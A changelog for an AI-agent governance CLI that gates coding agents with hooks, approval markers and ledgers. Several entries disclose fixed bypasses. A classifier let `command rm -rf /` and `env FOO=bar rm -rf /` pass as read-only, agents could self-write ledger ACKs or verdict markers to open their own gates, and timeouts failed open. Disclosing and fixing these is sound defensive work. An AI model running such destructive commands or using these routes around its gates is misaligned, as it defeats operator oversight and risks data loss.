- **Two fixed-window test flakes replaced with readiness handshakes** (PRs #330, #332). The smoke SIGKILL-escalation test spawns its trap child directly and waits for the trap to be installed before handing it to `runSmoke`, so the runner's timeout window only starts once SIGTERM is guaranteed to be swallowed. The io lock concurrency test polls for worker A's `A:lock-acquired` marker instead of assuming a fixed 50ms head start, which under CPU contention let worker B win the first-acquire race and flip the `[A,B]` assertion.

## [0.39.0] - 2026-07-02

**Headline: the 2026-07-01 deep-review remediation ships — enforcement no longer degrades under load, the `grounding:` section finally does something, and `apply --merge` stops eating operator edits.** The PreToolUse gate pools one grounding-mcp session per intercept (a hook timeout no longer silently fail-opens enforcement), `grounding.evidence_ledger.path` now actually configures the grounding-mcp entry, `apply --merge` preserves operator-added mcpServers with provenance, the Codex understanding-gate reaches approval-lifecycle parity with Claude Code, `diff --since` stops reporting override layers as phantom history, and CI gains two architecture fitness gates plus new `validate` lints (git-ignored OW knob, block policies without declared producers). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **Two architecture fitness functions now run in CI** (task 19e293c6, harness-review-2026-07-01). `npm run check:boundaries` (dependency-cruiser 18.0.0, `.dependency-cruiser.cjs`) pins the layering schema → policies → runtime → policy-packs → cli and fails on any new reverse import; running it for the first time surfaced four pre-existing shared-util edges (`policies/duration`, `policies/extract`, `runtime/ledger-record`, `runtime/expand-home` imported from below), which are grandfathered per target file and documented in the config with a pointer to the structural-concentration follow-up (f86b2425). `npm run check:duplication` (jscpd 5.0.11 via `scripts/check-duplication.mjs`) pins the clone count in `src/` at the post-extraction baseline of 82: a percentage threshold cannot see a single new ~16-line copy, an absolute count can — raising the pin requires an in-PR justification. Negative-control verified: a deliberate reverse import fails `check:boundaries` (exit 1), and the pre-extraction tree (85 clones) fails `check:duplication`.
- **The `grounding:` manifest section is wired: `grounding.evidence_ledger.path` now configures the grounding-mcp entry** (task 129e1b94, harness-review-2026-07-01). `apply` projects the path as the `EVIDENCE_LEDGER_DB` env on the enabled grounding-mcp entry (the exact variable its ledger-bridge reads), `~`-expanded to an absolute path; an operator-declared env override wins. `adopt` mirrors the same synthesis so the apply→adopt round-trip stays drift-free, and `doctor` gains a Grounding section that checks the EFFECTIVE ledger path for writability and warns when an override diverges from the manifest value. `session.*`, `retention_days`, and `policies_source` stay RESERVED with explicit status comments (no consumer exists yet).
- **Trust-model tripwire for custom `block` policies, plus a `validate` warning on undeclared producers** (task 43b107f2, harness-review-2026-07-01). writing-custom-policies.md gains a fourth "Read this first" tripwire spelling out that whoever can write the ledger can open a `requires:`/`ledger_tag` gate: block policies are advisory against the very agent they gate, and an enforcing gate needs a non-agent evidence actor. New `checkPolicySelfAttestation` in `validate` warns when a `block` policy declares no `producers:` at all (`require_approval` excluded with a recorded rationale); the recipes and templates now model the pattern, closing the agent-writable `risk-override` gap on the FULL_TEMPLATE's `gate-prod-destructive`. Engine hardening is tracked as follow-up task 078ec604.
- **`harness validate` / `harness doctor` now warn when the solution-acceptance pack is enabled but the OW knob path is git-ignored** (task 24f6ceb9, ow-review-2026-07-01). The orchestrator-workflow arm reads repo state (`.ai/solution-acceptance.json` plus run completeness under `.ai/runs/`); a repo that ignores `.ai/` wholesale cannot commit its enforcement posture, so fresh clones and git worktrees silently skip the OW arm under the default `auto` knob. The shared check (`checkSolutionAcceptanceKnobIgnored`) probes `git check-ignore` against the process cwd, stays silent outside a git repository and in `doctor --shallow` runs (no spawns), and lands in the same Policy Packs section as the producer deadlock checks. Negative control: a repo that ignores only `.ai/runs/` produces no warning.

### Changed

- **`parseConfigUx` exists once** (task 19e293c6). The four byte-identical copies in hook-pre-tool-use, hook-codex-pre-tool-use, hook-branch-protection, and hook-solution-acceptance (the CHANGELOG had flagged the third copy for extraction; the fourth landed anyway because no scan existed) are now one shared helper in `src/cli/pack/hook-bootstrap.ts`, parameterized by the hook's stderr label. The per-hook warning output is byte-identical to the pre-extraction strings, pinned by a test per label.
- **The harness repo itself now commits its OW enforcement posture** (task 24f6ceb9; operator-approved revision of the earlier ".ai/ fully gitignored" decision, which was about run noise). `.gitignore` narrows `.ai/` to `.ai/runs/`; `.ai/workflow/` (kit templates + manifest) and `.ai/solution-acceptance.json` (committed as `"orchestratorWorkflow": "on"`) are now tracked, so the solution-acceptance OW arm enforces in every checkout, including fresh clones and worktrees. `docs/policy-packs/solution-acceptance.md` gains a "Repo state and gitignore" section documenting the convention and the honest residual (run-to-change binding is agent-grounding `067bede3`).
- **The symlink-rejecting gate-marker read exists once** (task f86b2425 slice 1). `checkApprovalMarker` (understanding-before-execution) and `readVerdict` (solution-acceptance) now share `readRegularFileRejectingSymlink` in `src/io/` (5-kind result; every deny detail and the exists-but-unreadable-still-satisfies semantic byte-identical). Future defensive fixes (lstat/read race, ENOTDIR handling) have a single home.

### Fixed

- **First run on a fresh machine no longer dead-ends** (task 24ec07a6, harness-review-2026-07-01). Every read verb (`doctor`, `describe`, `validate`, `list`, `explain`, ...) previously failed with a bare `manifest not found: <path>` when no `harness.yaml` exists; the base-manifest miss now appends `No harness.yaml on this machine yet: run harness init --interactive (or harness init --template solo) to create one` (same message shape, same exit 66; a missing override LAYER keeps the old message, since "run init" would be wrong advice for a mid-read race). Also fixed two doc-drift items the same review flagged: docs/for-agents.md's `${REPO}` row claimed "basename of cwd" (the code resolves the basename of the git worktree ROOT) and its `${BRANCH}` row promised a `(detached)` placeholder that has never existed (detached HEAD substitutes the empty string); docs/init-interactive.md's Custom-flow pack list was missing `branch-protection` and now notes that `solution-acceptance` is deliberately not wizard-selectable.
- **A manifest with the wrong `version` now gets upgrade guidance instead of a bare zod literal error** (task 50a94127, harness-review-2026-07-01). `version: 2` produces `this CLI supports manifest version 1; your manifest declares version 2. A newer manifest needs a newer CLI: re-run npm i -g @lannguyensi/harness ...` on every parseManifest surface (`validate`, `doctor`, `describe`, ...); a manifest missing the key gets the distinct `missing manifest version: add version: 1` variant instead of wrong upgrade advice. Message wording only: issue codes, paths, error type, and exit codes are unchanged. Also corrected two dishonest schema comments: `risk:` was still annotated "no runtime surface reads them yet" in schema/index.ts and risk.ts although `risk.classifiers[]` has been live since Phase 7 (classifyRisk on every PreToolUse + `when.risk.*` in when-eval); and the genuinely inert keys `memory.scopes` / `memory.retention.broken_refs` now carry explicit `STATUS: INERT` disclosure comments (validated, read by no consumer) instead of looking like live configuration.
- **`apply --merge` no longer clobbers operator-added `mcpServers` entries — and manifest-removed/disabled servers still leave the target** (task 059b669c, harness-review-2026-07-01; operator decision: deep-merge over warn-only). The merge is now per server name inside `mcpServers`, with provenance from `.last-apply`: names the manifest declares come from the generated output; a server the operator hand-added directly to the target settings.json survives (`kept N operator-added mcpServer(s) (...)` in the apply summary); a server harness wrote on a previous apply that the current manifest no longer emits (deleted, or `enabled: false`) is dropped (`dropped N manifest-removed mcpServer(s) (...)`), so `enabled: false` remains an effective kill switch on `--merge` targets. Without provenance (no `.last-apply` yet, a record without a settings.json entry, or a corrupt record) unknown names are conservatively preserved. `hooks` stays wholesale-owned (no stable per-entry identity in the settings shape; hand-added hooks belong in the manifest via `harness adopt`). The merge remains idempotent, and a malformed (non-object) `mcpServers` on either side falls back to the old wholesale replace.
- **`adopt` no longer drops hook `timeout` or MCP `min_version`/`version_command` on the round-trip** (task 059b669c). `parseSettingsHooks` now captures a settings hook's `timeout` (positive integers only) and `buildHookEntry` carries it into `budget_ms` — 1:1 with apply's projection, so adopt→apply round-trips the value losslessly for newly adopted hooks (a timeout-only hand-edit to an already-declared hook is deliberately ignored: `timeout` is not part of the drift key, because hooks adopt add-only and a timeout-only difference would otherwise create a duplicate entry — pinned by a test). `buildMcpEntry` now also carries forward `min_version`/`version_command` from the existing manifest entry on a replace-modified drift (previously only `health` and `enabled: false`, despite the comment claiming full manifest-only-field preservation; the comment now enumerates exactly what is carried).
- **The Codex understanding-gate PreToolUse hook now honors `approval_lifecycle` and task-scoped markers** (task e7c2ec3c, harness-review-2026-07-01). The Codex hook previously called the bare session-marker check, so `approval_lifecycle.max_age` (expired approvals) and the active-claim task-scoped marker silently applied only to Claude Code sessions — a stale Codex approval still opened the gate, and a task-scoped `harness approve understanding --task` marker was invisible to Codex. Both hooks now resolve markers through one shared code path (`checkOperatorApprovalMarkers` in the understanding-before-execution runtime): task-scoped marker first, session marker second, both under the same TTL. The Claude hook's stderr/decision contract is unchanged; the Codex hook gains the same task-scope trace line on a miss. Pinned by five parity tests (expired blocks / fresh allows / task-scoped allows / different-task marker blocks / stale task marker blocks). Known residual: the pack wires no Codex PostToolUse hook, so `expire_on_tool_match` boundaries still do not fire in Codex sessions (tracked as a follow-up task).
- **The PreToolUse runtime gate no longer spawns two grounding-mcp subprocesses per matching policy** (task a2589fa3, harness-review-2026-07-01). `harness policy intercept` previously spawned them sequentially per policy; under load that approached the 30s hook budget, and a hook timeout is conventionally fail-open, so enforcement silently stopped exactly when contention was highest. One lazily-spawned grounding-mcp session per intercept invocation now multiplexes `ledger_summary`/`ledger_add` over a single stdio pipe, with a per-session summary cache (the K per-policy queries are identical and collapse into one) and a session-level timeout latch bounding worst-case ledger time at ~1 timeout. Decision semantics untouched: serial evaluation, first blocking decision in manifest order owns the deny envelope, warn-degraded never blocks.
- **`harness diff --since <ref>` no longer reports the override merge itself as phantom diffs** (task b2660f9e, harness-review-2026-07-01). The ref side previously compared a bare `git show <ref>:harness.yaml` against the override-merged present, so any operator using override layers saw the merge as diffs indistinguishable from real manifest history. The ref side now merges the SAME resolved layers: a versioned layer is read at the ref (true layer history), a layer added since the ref is a real effective-config change, and a non-versioned layer (e.g. a `~/.harness` home elsewhere) is applied to both sides so the constant cancels out — surfaced via `DiffResult.warnings` on stderr, keeping stdout a pipeable diff.

## [0.38.0] - 2026-06-27

**Headline: the Risk Gate now flags fail-closed unclassified matches across the audit trail, and `validate` / `doctor` lint risk policies that forgot to scope by `environment.name`.** When a risk-gate policy fires only because the action was unclassified (the "unknown is not safe" rule), `harness audit` (table and `--json`) and `harness explain --trace` now mark the decision, so an operator reviewing a deny can tell a real critical-severity match from a fail-closed one. A new lint, shared by `harness validate` and `harness doctor`, warns when a `when:` block gates on `risk.severity_at_least` / `risk.category_in` / `action.reversible` without an `environment.name` scope (those clauses match every unclassified command in every environment). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness validate` now warns on risk-gate policies without an `environment.name` scope** (M7). A policy with `risk.severity_at_least`, `risk.category_in`, or `action.reversible` in its `when:` block but no `environment.name` clause fires on every unclassified command in every environment (the "unknown is not safe" fail-close rule). `validate` emits a `severity: "warning"` diagnostic at `policies[<index>]` pointing at `docs/risk-gate.md`. The negative control (same clauses plus `environment.name`) produces no warning. `harness doctor` delegates to the same shared check (`checkPolicyRiskWithoutEnvScope`), so its risk-gate health section reaches parity with `validate` and now also warns on `action.reversible`-unscoped policies; doctor previously excluded `action.reversible` based on an incorrect assumption that its clause matched `false` on an unclassified action.
- **Audit record and block-time deny message now flag a fail-closed unclassified match** (M7). When a risk-gate policy fires because the action was unclassified rather than a genuine classification hit, `PolicyDecision.whenUnclassifiedFallback` is set to `true`. The field is serialised into the `policy_decision` ledger row and surfaces on three CLI paths: `harness audit` (table) annotates the reason column with `[unclassified-fallback]`; `harness audit --json` includes the `whenUnclassifiedFallback: true` field on each decision object; `harness explain <policy> --trace --json` includes `whenUnclassifiedFallback: true` in the JSON trace projection. The non-ux block-time deny message appends `(matched via the fail-closed unclassified rule, not a real risk classification)` before the hint suffix so the agent-facing message names the cause. Policies with a `ux:` block are not altered at the agent-facing surface; the flag still rides the audit record and is visible in `harness audit` and `explain --trace`.

## [0.37.0] - 2026-06-25

**Headline: `harness doctor` learns the solution-acceptance deadlock checks, plus a sessionId-namespace fix to ledger-deny hints and clearer intercept / approve-understanding diagnostics.** `harness doctor` now reports the two solution-acceptance misconfigurations that deadlock the completion-gate (parity with `harness validate`), ledger-gate deny hints name which sessionId namespace to record the unblocking entry under, the understanding-gate admits read-only Bash pipelines for post-task CI polls, and `harness validate` now hard-errors on a solution-acceptance pack with no reachable producer. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness doctor` now surfaces the solution-acceptance producer/dir deadlock findings** (task 08ccfe87). The two misconfigurations that `harness validate` already catches are now also reported by `harness doctor` in the Policy Packs section: condition #1 (grounding-mcp absent from `tools.mcp`) is reported as an error, condition #2 (relative `SOLUTION_VERDICT_DIR` in grounding-mcp env) as a warning. `checkSolutionAcceptanceProducer` is the single source of truth for both checks; no logic is duplicated.

### Changed

- **Ledger-gate deny "to satisfy" hints now name the sessionId namespace** (task cdc60d56, discovery 2026-06-24). The hint previously showed the session id value but not which namespace it is; an entry written under the agent-tasks task UUID never satisfies a harness runtime gate, which keys off the runtime session id (the 2026-05-17 incident on PRs #174/#175: a first attempt wrote under the task UUID and was rejected, the second under the session id and passed). The format is now `... To satisfy: record an evidence-ledger entry containing \`<tag>\`, under this runtime session's id \`<id>\` (not the agent-tasks task UUID).` Naming an identity is not a producer verb, so the deny path stays neutral on producer (agent-tasks/88ca4bb3).
- **`harness validate` now errors (was a warning) when the `solution-acceptance` policy pack is enabled but `grounding-mcp` is not wired under `tools.mcp`** (task e3af6388). Without a reachable `solution_evaluate` producer the completion-gate can never see a verdict and deadlocks on a permanent deny, so this is a hard misconfiguration rather than a soft warning. A relative `SOLUTION_VERDICT_DIR` (the other producer condition) stays a warning. Operator impact: a manifest with `solution-acceptance` enabled but `grounding-mcp` absent now makes `harness validate` exit 1 where it previously exited 0.

### Fixed

- **Surface a previously-swallowed audit-write failure in the runtime policy intercept** (task 6b8e53cc). `intercept()` caught and silently discarded an unexpected throw from `ledger.record()`, leaving `harness audit` / `explain --trace` blind with no signal. The catch now writes a `harness runtime intercept: audit-write failed for <policy>: <error>` diagnostic to stderr while preserving the fail-open contract (the gate decision is still applied; the stdout deny-JSON is untouched). This is a defense-in-depth backstop for an unexpected `record()` throw; the common `{ok:false}` write-failure path (connection refused / spawn fail / timeout) was already surfaced one layer down at `realLedgerClient.record`.
- **`harness approve understanding` now names the cause when a manifest-load failure degrades the ledger write** (task 6b8e53cc, M8). The manifest load wrapped the ledger-write path in a bare `catch {}`, so an unparseable / missing manifest left the operator with `ledger: ok false` and the generic reason `manifest unreadable; skipped ledger write` — no diagnosis. The captured loader error is now interpolated into the reason (`manifest unreadable (<cause>); skipped ledger write`); the report flip still runs (fail-open preserved).
- **The understanding-gate PreToolUse hooks now allow a read-only Bash *pipeline*** (task 1d024fff, friction #36/#69/#72). A post-task CI poll like `gh pr checks 123 | head` was blocked because the read-only classifier hard-refused any `|`, so confirming CI right after `task_finish` forced a fresh Understanding Report. A new `isReadOnlyBashPipeline` (used only by the Claude and Codex understanding-gate hooks) admits a single-`|` pipeline when *every* stage independently classifies read-only, while still refusing `;`, `&`, `&&`, `||`, `|&`, redirection, and command substitution. A pipeline of read-only stages cannot write, so this widens nothing the gate must stop. The strict `isReadOnlyBashCommand` is unchanged for its other consumers (the Risk Classifier read-only floor and the solution-acceptance write-guard). Scope: this is the read-only fix only; post-task *writes* (e.g. `gh pr comment`) remain gated by design.

## [0.36.0] - 2026-06-16

**Headline: a doctor cleanup mode for rogue ledgers, plus gate-admission and pause-sentinel fixes.** `harness doctor` gains an opt-in `--rm-rogue-ledgers` mode, the read-only Bash classifier re-admits `sort`, `tree`, and `file` behind precise write-flag guards (they were over-blocked), and the runtime-reality gate now honors the pause sentinel like every other gate. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness doctor --rm-rogue-ledgers` opt-in cleanup mode** (PR #296). Doctor can now remove rogue evidence ledgers it finds, gated behind an explicit flag so a bare `doctor` run stays read-only.

### Security

- **Validate `sessionId` before joining it into the session-export transcript path** (PR #294). `session-export` joined `sessionId` into the transcript path with no validation; a `rejectMalformedSessionId` guard (rejecting blank values, path separators, and `..`) now runs at the path-construction choke point.

### Fixed

- **Re-admit `sort`, `tree`, and `file` in the read-only Bash classifier behind precise write-flag guards** (PR #292). These commands were over-blocked; they are now admitted unless invoked with a write-producing flag (for example `sort -o`).
- **Honor the pause sentinel in the runtime-reality gate** (PR #291). The runtime-reality checker now respects the pause sentinel like every other gate instead of firing while the harness is paused.

### Changed

- **Dedupe `rejectMalformedSessionId` to the shared runtime helper** (PR #295) and **extract a shared `resolveApprovalSessionId`** (PR #293, discovery M5). Internal refactors consolidating session-id handling, with no behavior change.
- **Remove em dashes from prose** per the org style rule (PR #290).

## [0.35.0] - 2026-06-14

**Headline: the Tier-1 discovery follow-up.** The five HIGH findings from the 2026-06-10 discovery audit are fixed: a defense-in-depth gap in the approval-marker path, the long-standing `harness add` whole-manifest footgun, a solution-acceptance verdict-dir mismatch, a policy-degradation footgun that `apply` did not catch, and an integration suite that never ran in CI. **Operator action**: `harness apply` now refuses a manifest that declares `policies:` without wiring grounding-mcp under `tools.mcp` (previously it applied and the policies silently degraded to warn-mode at runtime); wire grounding-mcp or remove the policies. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Security

- **Validate `sessionId` before joining it into approval-marker paths** (task 96178e12, discovery H5, PR #284). `approvalMarkerPathFor` joined `sessionId` into the `.approvals/` path with no validation, unlike the task-marker twin. A new `rejectMalformedSessionId` guard (rejecting blank, path separators, and `..`) is applied at the single path-construction choke point, and the gate read path (`checkApprovalMarker`) fails closed (blocks, returns no match) instead of throwing out of the hook on a malformed value.

### Changed

- **`harness add` asset gate is scoped to the entry being added** (task 57ea5f5b, discovery H1, recurring footgun). `add` ran `runAssetChecks` over the whole proposed manifest and blocked on any error, so an unrelated pre-existing problem (for example a missing required CLI from `init --template full`) sank an otherwise-fine hooks-only add. The gate now blocks only on asset errors introduced or newly caused by the added entry (a baseline diff against the original manifest); pre-existing unrelated errors are surfaced as a non-blocking warning pointing at `harness validate`. `harness validate` stays whole-manifest.
- **`harness apply` fails loud on policies without grounding-mcp** (task 09120efb, discovery H3, PR #288). `checkPolicyGroundingMcp` ran only in `validate` (a warning). An operator who ran `apply` without `validate` could deploy policies that silently degrade to warn-mode at runtime. `apply` now runs the same check in its gate phase and fails closed with a message naming the degradation and the fix. See the operator action above.
- **CI runs the integration suite** (task 6791ba98, discovery H7, PR #286). `tests/integration/operator-state-isolation.test.ts` was gated behind `HARNESS_INTEGRATION_TESTS=1` that CI never set, so the operator-state-isolation acceptance ran nowhere. A dedicated CI step now runs `npm run test:integration` on push and PR.

### Fixed

- **Project `SOLUTION_VERDICT_DIR` into the solution-acceptance hook** (task d4395979, discovery H2, PR #287). The completion-gate hook (consumer) read the verdict marker the grounding-mcp server (producer) writes, but harness did not project a manifest-declared `tools.mcp[grounding-mcp].env.SOLUTION_VERDICT_DIR` into the hook, so a non-default override split producer and consumer onto different dirs and the gate could never see a verdict. `apply` now projects the override onto both solution-acceptance hook commands, mirroring the `UNDERSTANDING_GATE_REPORT_DIR` pattern. The `validate` warning is corrected: an absolute override is now handled silently, and only a relative override (which cannot be reconciled across working directories) warns.

## [0.34.0] - 2026-06-10

**Headline: the discovery release.** A live-reproduced gate-integrity bug is closed: `harness approve understanding` could silently bind a fresh session to a weeks-old leftover report when the producer Stop hook failed (finding C1 of the 2026-06-10 discovery audit); the tolerant fallback now rejects stale sessionId-less candidates, prints loud adoption warnings, and orders reports by creation time instead of mtime. Around it: non-TTY-safe confirmations on `apply` and `adopt` (with `apply --yes`), `validate --json`, a new `harness gc` retention cleanup, an `uninstall` that finally sees the `~/.harness/` state root and now removes migrated state it previously left behind, and docs synced to reality. **Operator action**: none required unless you piped confirmation prompts (`echo yes | harness apply --overwrite-drift` now refuses; use `--yes`). Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`harness gc`: retention-based cleanup of gate state** (task 38943a05, harness-discovery M3). Nothing ever deleted terminal understanding-gate reports, parse-error logs, or approval markers of dead sessions; the reports dir on the originating install accumulated 103 files in under a month, and stale leftovers were the raw material of the C1 stale-adoption bug. The new verb ages out artifacts older than a retention window (default 30 days, `--retention-days <n>`): terminal-status (approved/expired) reports by their createdAt, parse-error logs and approval markers by mtime. Pending reports are never touched regardless of age, and only the enumerated harness-owned dirs are considered; the evidence ledger and solution-acceptance verdict dirs stay producer-owned. Dry-run by default, `--apply` deletes; per-file deletion failures are surfaced loudly and fail the command.

- **`apply --yes`, non-TTY guards on confirmation prompts, `validate --json`** (task 0f901128, harness-discovery H4 + H6). The `apply --overwrite-drift` and `adopt` confirmation prompts read stdin via readline with no TTY check, so a triggered confirmation in CI or an agent-driven shell blocked forever waiting for input that never comes. Both default prompts now refuse loudly under a non-TTY stdin and name the escape hatch; `apply` gains `--yes` (skip the overwrite-drift confirmation, as if the operator typed `yes`; `adopt` already had it). Interactive TTY behavior is unchanged. `harness validate` gains `--json`, emitting `{ diagnostics, errorCount, warningCount }` on stdout with exit-code semantics unchanged, closing the gap with `describe` / `doctor` / `list` for CI and agent pipelines. (Discovery note: the H4/H6 write-up claimed `--yes` was missing everywhere; `adopt --yes` and `apply --json` already existed. The real gaps were `apply --yes`, the two TTY guards, and `validate --json`.) Breaking workaround: piping the confirmation (`echo yes | harness apply --overwrite-drift`) previously worked and now refuses, since piped stdin is exactly the non-TTY case the guard exists for; use `--yes` instead.

### Fixed

- **`uninstall` was blind to the `~/.harness/` state root and left `.understanding-gate/` behind** (task 38943a05, harness-discovery M2). Uninstall hardcoded `~/.claude/` as the only root, so on installs migrated by `migrate-home` (v0.24.0) it found no manifest, lock, or `harness.generated/` to remove and tore down essentially nothing but settings.json entries. It now resolves the state root through the shared resolver (`~/.harness/`, legacy fallback, `HARNESS_HOME` env; `--state <path>` override), inventories and removes `.understanding-gate/` (reports, parse-errors, hypotheses) alongside manifest/lock/generated, and prints both roots when they differ. An explicit `--home` without `--state` keeps the historic single-directory contract. Also fixed: two raw NUL bytes embedded in template literals made the source file binary to grep/file tooling; they are now `\u0000` escapes (behavior identical).

- **Docs synced to the shipped binary** (task 27adde6d, harness-discovery M9 + L1). README and `docs/CLI.md` claimed `v0.30.0` (three releases behind); CLI.md now tracks `v0.33.0` and gains the verbs shipped since: `approve branch-protection`, `pack hook solution-acceptance[-writeguard]`, `pack hook runtime-reality`, plus the previously undocumented `pack hook stay-in-scope`. Corrected along the way: the Hook-entrypoints table documented a top-level `harness hook ...` namespace that does not exist (the runtime entrypoints live under `harness pack hook ...`; `harness add hook` is the unrelated manifest mutation). New `docs/policy-packs/solution-acceptance.md` documents the pack end-to-end, including the `SOLUTION_VERDICT_DIR` / `SOLUTION_VERDICT_ID` env knobs that previously existed only in CHANGELOG entries; `writing-custom-policies.md` now names three builtin packs. The stale `branch-protection.ts` header comment claiming the full template does not wire the pack (it ships `enabled: true`) is fixed.

### Security

- **`approve understanding` no longer adopts stale sessionId-less reports via the tolerant fallback** (task adc20a8b, harness-discovery C1, friction-log #67). Live repro 2026-06-10: with the live session's report never persisted (a silent Stop-hook producer failure, tracked separately in agent-grounding), `harness approve understanding` adopted the only candidate on disk, a 17-day-old sessionId-less pending report, validated it, stamped the fresh sessionId onto it, and printed only "passed structural checks". Three changes close this: (1) the tolerant fallback rejects sessionId-less candidates older than 15 minutes (`TOLERANT_FALLBACK_MAX_AGE_MS`); the rejection is its own error path naming the file, its createdAt, and its age, and pointing at `parse-errors/`, since a stale-only state usually means the producer failed to persist the fresh report. (2) When a fallback adoption does happen, the CLI prints the adopted report's createdAt and age with a verify-this warning instead of flipping it silently. (3) Report listing now orders by creation time (JSON `createdAt`, then filename ISO prefix, mtime as last resort) instead of mtime, which the approval rewrite itself bumps, so selection stays deterministic under rewritten files. The strict sessionId match and the gate-read / expiry paths (`tolerantFallback: "any"`, no age limit) are unchanged.

## [0.33.0] - 2026-06-09

**Headline: a security-driven release that closes two gate-bypasses.** A read-only-bash classifier hole let `command rm -rf /` and `env FOO=bar rm -rf /` run as "read-only" past the hard Understanding Gate, and the branch-protection override could be self-blessed by an agent-writable ledger ACK. Both are now closed: command runners recurse-classify their nested argv, and the branch-protection override is an operator-only canonical marker (new `harness approve branch-protection` verb), mirroring the understanding gate. Also bundled: a vitest CVE bump, clearer gate-block messages surfaced by dogfooding, and a `SOLUTION_VERDICT_ID` knob for solo sessions. **Operator action**: none required, back-compat. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`solution-acceptance`: `SOLUTION_VERDICT_ID` env knob for solo / non-agent-tasks sessions** (task 01435583, PR #272): the completion-gate derived the verdict id solely from the agent-tasks `active-claim`, so a session that never calls `task_start` was permanently blocked with "no active-claim". It now falls back to a `SOLUTION_VERDICT_ID` env var when no claim is present. Resolution order is active-claim first, then `SOLUTION_VERDICT_ID`, then fail-closed, so a claimed session's id stays authoritative and cannot be redirected by the env (a sessionId fallback is still intentionally absent). The env value is validated as a safe single path segment; a malformed value fails closed. Set it to the same id you pass to `mcp__agent-grounding__solution_evaluate({ id })`.

### Changed

- **Gate-block messages are clearer about preflight ordering, mode-aware wording, and the approve escape hatch** (PR #274), surfaced by dogfooding the gates. `preflight-before-investigation` / `preflight-before-push` `ux.required` now note that `harness preflight` is itself gated by the Understanding Gate, so the "Run: harness preflight" remedy no longer dead-ends when the report is not yet approved. A new `understandingApprovalRequirement(mode)` helper derives the understanding `ux.required` phrase from the mode (only `strict` says "a human-approved Understanding Report"; `fast_confirm` / `grill_me` stay "an approved Understanding Report"); no output change for current `grill_me` profiles. `approveEscapeHint()` appends a targeted hint when a blocked Bash command starts with `harness approve` but trips the (unchanged) metachar guard, telling the agent to re-run it bare; the understanding `ux.run` line gains the same "(bare, no pipes, chaining, or redirection)" guidance.

### Security

- **Command runners `env` / `command` no longer bypass the hard gate** (HIGH audit finding, PR #271). The read-only-bash classifier listed `env` and `command` in `SIMPLE_READ_ONLY_BINS`, so the gate treated `command rm -rf /tmp/x` and `env FOO=bar rm -rf /` as read-only and allowed them without an approved Understanding Report, a hard-gate bypass across `hook-pre-tool-use`, `hook-codex-pre-tool-use`, and `hook-solution-acceptance-writeguard`. Both binaries are command runners (their argv is itself a nested command); they are removed from the simple set and given a find-style special case that strips the runner's own leading flags/assignments and recurse-classifies the residual underlying command. Bare and lookup-only forms (`env`, `env -u X`, `command -v node`) stay read-only; `env -S` / `--split-string` fails closed since it re-parses a string into a fresh argv that defeats whitespace tokenization.

- **branch-protection override is now an operator-only canonical marker** (MEDIUM audit finding #39, PR #275). The override was satisfied by any `branch-protection-ack` ledger entry, which an agent can self-write via `mcp__agent-grounding__ledger_add`, letting it bless its own protected-branch edit. The agent-writable ledger ACK is replaced with an operator-only canonical marker file under `harness.generated/.approvals/branch-protection-<sessionId>`, mirroring the understanding gate (`writeApprovalMarker` / `checkApprovalMarker`). A new operator verb `harness approve branch-protection` writes the marker and records the `branch-protection-ack` ledger row as a best-effort audit echo only. The blocker now reads the marker as the canonical override; the ledger tag alone no longer opens the gate.

- **vitest bumped to `^4.1.4`** (CVE-2026-47429 / GHSA-5xrq-8626-4rwp, PR #273). vitest < 4.1.0 lets the UI server read and execute arbitrary files. vitest is a devDependency; the lockfile is regenerated.

## [0.32.0] - 2026-05-30

**Headline: harness ships a new opt-in `solution-acceptance` policy pack that makes task completion EARNED from a real preflight run rather than self-attested.** The producer (`@lannguyensi/grounding-mcp` >= 0.3.2 `solution_evaluate`) records a HEAD-pinned verdict from a real `preflight run --json`; this pack gates the task-finishing tools (agent-tasks completion verbs + `git push` / `gh pr merge`) on a ready verdict at the current HEAD, and adds an anti-forgery write-guard so the agent cannot hand-write the verdict marker. **Operator action**: none required, back-compat. The pack is opt-in (`harness pack add solution-acceptance`, or flip the disabled exemplar in the full template); it needs `grounding-mcp` under `tools.mcp` and the `preflight` binary on PATH, and `harness validate` warns if you enable it without the producer. Re-run `npm i -g @lannguyensi/harness` to upgrade.

### Added

- **`solution-acceptance` builtin policy pack** (task cc43c7a4, PR #269): the consumer half of the "Verifier-gated Done" gate. Two `blocking: hard` PreToolUse hooks:
  - `completion-gate` (`harness pack hook solution-acceptance`): denies `task_finish` / `task_submit_pr` / `task_merge` / `pull_requests_merge` and `git push` / `gh pr merge` unless a ready solution-acceptance verdict exists at the current git HEAD for the active-claim task. Fail-closed (missing / not-ready / HEAD-drift / unresolvable-HEAD / no-active-claim all block); the verdict id is the active-claim task id, never the session id.
  - `write-guard` (`harness pack hook solution-acceptance-writeguard`): the anti-forgery closure. Relocating the verdict dir is not sufficient (the understanding-gate allows all Bash post-approval), so this hook denies the agent's enumerated writes into the verdict dir (Bash redirects / `tee` / `mv` / `cp` / `ln` / interpreter writes that reference it, including glob-obscured spellings and `chmod`/`chattr` on the dir, plus Write/Edit/MultiEdit/NotebookEdit whose target lands inside it). The only legitimate writer is the producer.
  - harness is a pure consumer: it reimplements the marker read + gate decision locally (no `grounding-mcp` runtime dependency) and reads the producer-default verdict dir `~/.local/state/agent-grounding/solution-verdicts` (`SOLUTION_VERDICT_DIR` override). The gate decision is `ready && head === HEAD` only; `confidence` is informational (parity with the producer's `solution_gate`). A golden-fixture test pins the consumer field-for-field to a real 0.3.2 marker.
  - `harness validate` / `harness doctor` warn when the pack is enabled but `grounding-mcp` is absent from `tools.mcp` (the producer would be unreachable and the gate would deadlock) or declares a non-default `SOLUTION_VERDICT_DIR`. Added to the full init template as a disabled, discoverable exemplar (no No-Op default).
  - Anti-forgery scope is v1-honest: it closes the enumerated-write-path residual, not arbitrary same-uid forgery. Cryptographic marker signing (which also closes glob-every-segment and interpreter runtime-path-construction spellings) is a tracked follow-up.

## [0.31.0] - 2026-05-29

